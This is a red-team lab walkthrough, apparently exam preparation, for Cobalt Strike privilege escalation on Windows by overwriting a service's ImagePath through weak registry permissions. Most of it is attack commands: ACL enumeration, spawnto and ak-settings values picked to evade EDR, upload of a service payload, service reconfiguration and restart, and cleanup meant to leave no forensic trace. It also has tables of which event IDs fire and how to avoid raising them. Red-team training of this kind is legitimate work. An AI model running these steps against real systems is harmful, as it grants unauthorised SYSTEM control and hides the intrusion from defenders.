# Privilege Escalation Lab

> **Objective:** Exploit weak service registry permissions to escalate from a low-privileged user beacon to a SYSTEM beacon.

---

## Methodology Context — When and Why This Phase Exists

> **Where this fits in the exam attack chain:**
> ```
> Initial Access (beacon as pchilds, medium integrity)
>   → [Phase 4] COM Hijack Persistence (user-level — deploy FIRST, no admin needed)
>   → [THIS LAB] Privilege Escalation → SYSTEM beacon
>   → [Phase 6] Elevated Persistence (WMI event subscription — requires SYSTEM)
>   → Credential Access → Lateral Movement → ...
> ```

**Why you need SYSTEM before you can progress:**

Many post-exploitation actions are gated behind high integrity or SYSTEM privilege:
- `krb_dump` to extract Kerberos TGTs from LSASS requires elevated access
- `dcsync` requires DA or replication privileges — you cannot get there from a user beacon
- WMI event subscription persistence requires admin-level WMI namespace writes
- Lateral movement techniques that write to remote admin shares (`ADMIN$`, `C$`) require a local admin token on the target

A medium-integrity beacon lets you enumerate, but SYSTEM is the operational pivot point.

**Why weak service registry permissions specifically:**

Windows services store their configuration in `HKLM\SYSTEM\CurrentControlSet\Services\<name>`. The `ImagePath` value is what the Service Control Manager executes when the service starts. If a low-privileged group (`Everyone`, `BUILTIN\Users`, `Authenticated Users`) has `FullControl` on that registry key, they can overwrite `ImagePath` with any executable — and when the service starts, it runs as SYSTEM.

This is a misconfiguration, not an exploit. No CVE, no patch bypass, no kernel interaction. It is:
- `OPSEC-🟠CAUTION`  the escalation generates service start/stop events, not a suspicious process injection
- Reliable — if the permission exists, it works
- Reversible — you restore the original binary path after getting the beacon

---

## Understanding `spawnto` — What It Is and Why It Matters Here

Before running any commands, you need to understand `spawnto` because it is set twice in this lab for two different reasons. Confusion between these two uses is one of the most common mistakes when preparing for the exam.

### Fork & Run

When you run `execute-assembly`, `powerpick`, `mimikatz`, or `portscan`, Cobalt Strike does **not** run that code inside the beacon process itself. Instead it:

```
1. Spawns a new sacrificial child process     ← THIS is what spawnto controls
2. Injects a post-ex DLL into that child
3. The DLL runs the task (assembly, PS script, etc.)
4. Output is sent back to beacon via named pipe
5. Child process is killed
```

The child process is called the **sacrificial process** — it is disposable. If Defender catches it, the beacon survives. If the post-ex DLL crashes, the beacon survives. The beacon never directly runs the noisy code.

**`spawnto` answers: "what process do I spawn when I need to run a post-ex task?"**

### Default Problem

Without setting `spawnto`, CS spawns `rundll32.exe` as the sacrificial process for every fork & run command:

```
beacon process
    └── rundll32.exe   ← Defender/EDR has explicit detection rules for this
            └── [your execute-assembly / powerpick DLL injected here]
```

`rundll32.exe` spawned as a child of your beacon is one of Cobalt Strike's most well-known default indicators. It is in Defender's behavioural rules, Sigma detection rules, and the exam OPSEC scoring explicitly checks for default CS indicators — this is a direct point deduction.

### `spawnto` Controls

This is the source of confusion. There are **three completely independent controls** with similar names:

| Control | Syntax | What it controls | Scope | When it applies |
|---------|--------|-----------------|-------|-----------------|
| Per-beacon runtime | `beacon> spawnto x64 <path>` | Sacrificial process for THIS beacon's fork & run | This beacon only, until changed | Every `execute-assembly`, `powerpick`, `mimikatz` from this beacon |
| Profile default | `post-ex { set spawnto_x64 "..." }` | Default sacrificial process for all new beacons | All beacons from this team server | Same as above but applies automatically to every new beacon |
| Service payload | `beacon> ak-settings spawnto_x64 <path>` | Process the Artifact Kit **service binary** spawns for shellcode injection | Service EXE payloads only | Only when a service EXE starts: `jump psexec64`, `jump scshell64`, service-based privesc |

Setting one does **not** affect the others. They are independent.

### Why Context Determines the Right Process

The sacrificial process must be **already legitimately running** on the target host, or be a process whose brief appearance raises no flags. This changes per host:

| Host type | Good spawnto choices | Why |
|-----------|---------------------|-----|
| Workstation (user logged in) | `msedge.exe`, `chrome.exe` | Browser already running — one more instance is invisible |
| Any Windows host | `werfault.exe` | Windows Error Reporting — legitimately spawns briefly and exits |
| Server (no GUI user) | `dllhost.exe`, `svchost.exe` | Common COM/service host processes |
| Service payload context | `svchost.exe` | Service spawning a service-host child is expected |

**The wrong `spawnto` does not prevent execution — it just makes your post-ex work visible to EDR.**

---

## Enumeration

### Step 0 — Set spawnto before any fork & run command

```cs
beacon> spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

**What this command does:**
Sets the sacrificial process for all subsequent fork & run commands from this beacon to `msedge.exe`. No process is spawned at this step — this is purely a runtime configuration change inside the beacon.

**Why `msedge.exe` on this workstation specifically:**
On `lon-wkstn-1`, a user (`pchilds`) is logged in. Microsoft Edge is already running as part of the user session. When `powerpick` fires and spawns a child `msedge.exe`, the EDR sees:

```
Existing legitimate Edge processes (already running)
beacon process
    └── msedge.exe (your sacrificial process — fork & run child)
            └── [powerpick unmanaged PowerShell DLL injected here]
```

Edge spawns many child processes by design — renderer processes, GPU processes, utility processes. One more `msedge.exe` in the process list is invisible noise. A `werfault.exe` process spawning to run a registry ACL enumeration query would look anomalous by comparison. Context matters: match the sacrificial process to what is already normal on that specific host.

**Why this is set here and not later:**
`powerpick` is the very next command. If you do not set `spawnto` first, `powerpick` will spawn `rundll32.exe` as the default sacrificial process — a signatured CS indicator — before you have a chance to change it. The order is: configure first, execute second.

> **OPSEC:** `OPSEC-🟢SAFE` — `spawnto x64` only sets a value inside the beacon. No process is spawned at this step, no event logs are generated.

---

### Step 1 — Enumerate weak service registry permissions

```cs
beacon> powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
```

**What this does:**
- Iterates every key under `HKLM:\SYSTEM\CurrentControlSet\Services` (every installed service)
- Gets the ACL of each key
- Filters for ACEs where: the identity is a low-privileged group **AND** the right is `FullControl` **AND** the ACE is not inherited
- Returns service name + identity + rights for any match

**Why `IsInherited -eq $false`:**
Inherited ACEs flow down from parent keys via Windows ACL inheritance. A non-inherited (explicit) ACE on a specific service key is a deliberate or accidental misconfiguration of that specific service — not a system-wide default. Explicit `FullControl` for `Authenticated Users` on one specific service key is the misconfiguration you are hunting.

**Why `FullControl` specifically:**
`FullControl` on a registry key includes `SetValue` permission, which is what you need to overwrite `ImagePath`. Lower rights (`ReadKey`, `QueryValues`) are not exploitable for this technique.

**OPSEC classification:** `OPSEC-🟠CAUTION`
- `powerpick` uses fork & run — spawns `msedge.exe` as the sacrificial process (per `spawnto` set above)
- Event 4688 (process creation) fires for the `msedge.exe` child — normal on a workstation where Edge is running
- The PowerShell code queries the registry via `Get-Acl` — no known Defender signature for this specific query
- No LDAP queries, no network traffic, no disk writes

> **Expected output:** `BadWindowsService` — a service whose registry key has `FullControl` granted to `Everyone` or `Authenticated Users`.

---

## Exploitation

### Step 2 — Set spawnto for the service payload (ak-settings)

```cs
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

**Why this is different from the `spawnto` set in Step 0:**

This is the second, completely separate `spawnto` control. The distinction is critical:

`beacon> spawnto x64 <path>` affects the **current beacon session's fork & run**. When you run `powerpick` or `execute-assembly` from this beacon, it spawns the process you specified.

`beacon> ak-settings spawnto_x64 <path>` affects **Artifact Kit service binary payloads**. A service EXE payload (`Windows Service EXE`) is a standalone binary that runs under the Service Control Manager as SYSTEM. It is **not** the beacon yet — it is the loader that creates the beacon. When it executes, it spawns a child process to inject the beacon shellcode into. `ak-settings` controls what that child is.

```
Without ak-settings:
  services.exe (SYSTEM)
      └── http_x64.svc.exe (your payload)
              └── rundll32.exe  ← default, highly signatured as CS indicator

With ak-settings spawnto_x64 svchost.exe:
  services.exe (SYSTEM)
      └── http_x64.svc.exe (your payload)
              └── svchost.exe   ← legitimate service host, expected process chain
                      └── [SYSTEM beacon running here]
```

The `spawnto` beacon command has zero effect on a service binary that hasn't loaded a beacon yet. They are separate execution contexts.

**Why `svchost.exe` for service payloads:**
`svchost.exe` is the Windows service host — the legitimate process that hosts most Windows services. The parent chain becomes `services.exe → http_x64.svc.exe → svchost.exe`. An EDR evaluating this chain sees a service binary spawning a service host — consistent with a service that delegates work to a subprocess. It is the most contextually appropriate process for a SYSTEM service execution context.

> **OPSEC:** `OPSEC-🟢SAFE` — `ak-settings` only sets a configuration value. No process spawned, no event logs.

---

### Step 3 — Generate service binary payload

```
Payloads > Windows Stageless Payload
  Listener: http
  Output:   Windows Service EXE
  Save to:  C:\Payloads\http_x64.svc.exe
```

**Why Windows Service EXE and not a regular EXE:**
When the Service Control Manager starts a service, it expects the binary to call `StartServiceCtrlDispatcher` — a Windows API that registers the service's control handler with the SCM. A regular EXE that skips this gets killed by the SCM with an error immediately after starting. A `Windows Service EXE` payload wraps the beacon shellcode loader with the SCM registration boilerplate so the SCM considers it a valid service binary.

**OPSEC prerequisite:**
The EXE will be written to disk. Defender real-time protection scans every file written to disk. If `artifact.cna` (your patched Artifact Kit) is not loaded in CS Script Manager, Defender will block the generated EXE on write to the target. Confirm `artifact.cna` is loaded before generating the payload.

---

### Step 4 — Stop the service

```cs
beacon> sc_stop BadWindowsService
```

**Why stop it first:**
You cannot reliably change the `ImagePath` of a running service and have the SCM use the new path. Stopping the service first ensures no handle contention on the registry key, and when `sc_start` runs later the SCM reads the freshly-written `ImagePath` from scratch.

**OPSEC:** `OPSEC-🟠CAUTION` — Event 7036 (service changed to stopped state) fires in the System event log.

---

### Step 5 — Change to writable directory and upload payload

```cs
beacon> cd C:\Temp
beacon> upload C:\Payloads\http_x64.svc.exe
```

**Why `C:\Temp`:**
Writable by low-privileged users, confirmed in this lab environment. Use the least-monitored writable path available. Avoid `C:\Windows\Temp` (more aggressively monitored) and user profile paths (tied to a specific user identity).

**OPSEC:** `OPSEC-🟠CAUTION` — File write to disk. This is the highest-risk moment in the entire technique. Defender real-time protection scans on write. If Artifact Kit is clean, the file survives. If not, Defender blocks it here before the service ever starts.

---

### Step 6 — Record current service configuration

```cs
beacon> sc_qc BadWindowsService
```

**Why this step matters:**
`sc_qc` retrieves the current `ImagePath` — the original service binary path. You need this exact string to restore the service after exploitation. Copy it from the output now. If you skip this step and cannot remember the original path, you leave the service permanently pointing at your payload or broken — both are residual indicators that cost OPSEC points.

---

### Step 7 — Reconfigure service to point at payload

```cs
beacon> sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
```

**Argument breakdown:**

| Position | Value | Meaning |
|----------|-------|---------|
| 1 | `BadWindowsService` | Service name to reconfigure |
| 2 | `C:\Temp\http_x64.svc.exe` | New `ImagePath` written to registry |
| 3 | `0` | Error control (`SERVICE_ERROR_IGNORE`) |
| 4 | `2` | Start type (`SERVICE_AUTO_START`) |

**What this writes:**
`HKLM\SYSTEM\CurrentControlSet\Services\BadWindowsService\ImagePath` = `C:\Temp\http_x64.svc.exe`

**OPSEC:** `OPSEC-🟠CAUTION` — Registry write. Event 4657 (registry value modified) fires if object access auditing is enabled on the target. This is a medium-signal event — a SOC monitoring service `ImagePath` changes would catch this.

---

### Step 8 — Start the service

```cs
beacon> sc_start BadWindowsService
```

**What happens in sequence:**
1. Service Control Manager reads `ImagePath` from registry → `C:\Temp\http_x64.svc.exe`
2. SCM launches `http_x64.svc.exe` as `NT AUTHORITY\SYSTEM`
3. Service binary calls `StartServiceCtrlDispatcher` (SCM handshake), then executes the Artifact Kit beacon stub
4. Stub spawns `svchost.exe` (per `ak-settings`) and injects beacon shellcode into it
5. Beacon shellcode runs inside `svchost.exe` as SYSTEM → calls back to team server → new SYSTEM beacon appears in CS

**OPSEC classification:** `OPSEC-🟠CAUTION`

| Event | ID | Why generated | Significance |
|-------|----|---------------|--------------|
| Service started | 7036 | Normal service restart event | Low signal — expected after sc_stop |
| New service installed | **7045** | **NOT generated** — you modified existing service | **Critical** — no 7045 = no explicit OPSEC deduction |
| Process creation | 4688 | `http_x64.svc.exe` starts, then `svchost.exe` starts | Visible to EDR — mitigated by `ak-settings svchost.exe` |

> **The absence of Event 7045 is the key OPSEC advantage of this technique over `jump psexec64`.** Modifying an existing service versus installing a new one is the difference between CAUTION and OPSEC-🔴UNSAFE.

> Immediately move to cleanup after the SYSTEM beacon checks in.

---

### Step 9 — Restore and clean up

```cs
beacon> sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
beacon> rm http_x64.svc.exe
beacon> sc_start BadWindowsService
```

**Why restore before doing anything else:**
- A service with `ImagePath` still pointing at `C:\Temp\http_x64.svc.exe` is an obvious artifact to anyone inspecting service configurations
- The exam OPSEC scoring checks for residual indicators left behind — this is exactly the kind that costs points
- Operational stability: the legitimate service may be depended on by other components

**Why `rm http_x64.svc.exe`:**
The payload EXE has served its purpose. A CS artifact stub sitting in `C:\Temp` is a static detection risk even when not running. Remove it the moment the SYSTEM beacon is stable.

**Why restart the original service:**
Returns the environment to its pre-attack state. No visible difference from before the attack.

---

## OPSEC Summary for This Phase

| Step | Command | Tier | Events generated | Key mitigation |
|------|---------|------|-----------------|----------------|
| Set fork & run spawnto | `spawnto x64 msedge.exe`  | OPSEC-🟢SAFE | None | Set before any powerpick/execute-assembly |
| Enumerate service ACLs | `powerpick $lowpriv...` | CAUTION | 4688 (msedge.exe child) | spawnto = context-appropriate process |
| Set service payload spawnto | `ak-settings spawnto_x64 svchost.exe`  | OPSEC-🟢SAFE | None | Must be set before generating service EXE |
| Stop service | `sc_stop` | CAUTION | 7036 (stopped) | Consistent with maintenance |
| Upload payload | `upload` | CAUTION | Defender scan on write | Artifact Kit must be loaded |
| Record config | `sc_qc`  | OPSEC-🟢SAFE | None | Record before modifying |
| Reconfigure service | `sc_config` (payload) | CAUTION | 4657 (if auditing on) | Keep window short |
| Start service | `sc_start` | CAUTION | 7036, 4688 — **no 7045** | ak-settings for process chain |
| Restore service | `sc_config` (restore) | CAUTION | 4657 | Removes residual artifact |
| Delete payload | `rm`  | OPSEC-🟢SAFE | File deletion | Removes disk artifact |

**No Event 7045 is generated.** That is the exam-critical distinction. All other events are consistent with a service restart cycle.

---

## What to Do Immediately After SYSTEM Beacon Appears

```cs
// From the new SYSTEM beacon:
beacon> getuid                    // confirm: NT AUTHORITY\SYSTEM
beacon> process_browser           // GUI — confirm beacon is in svchost.exe

// Reset fork & run spawnto for this SYSTEM beacon context
// (ak-settings controlled the service EXE — spawnto now controls this beacon's post-ex)
beacon> spawnto x64 %windir%\sysnative\werfault.exe

// Proceed to:
// → labs/Elevated-Persistence-lab.md  (WMI event subscription — requires SYSTEM)
// → Credential Access (krb_dump, dcsync now possible with elevated token)
```

---

## spawnto Placement in the Full Methodology

```
Phase 1 — Profile (team server startup)
  post-ex { set spawnto_x64 "werfault.exe" }   ← default for all new beacons

Phase 3 — First beacon checks in (workstation, user logged in)
  beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
  beacon> ppid <explorer.exe PID>               ← pair with ppid for full OPSEC

Phase 5 — Before service payload (privesc / lateral psexec / scshell)
  beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

Phase 10 — After every lateral move to a new host
  beacon> process_browser                        ← see what is ACTUALLY running here
  beacon> spawnto x64 <process-already-running>  ← match to that host's context
  beacon> ppid <appropriate-parent-pid>

Rule: set spawnto BEFORE running any execute-assembly, powerpick, or mimikatz.
      Match the sacrificial process to what is already normal on that specific host.
      ak-settings is only for service EXE payloads — it has no effect on beacon fork & run.
```
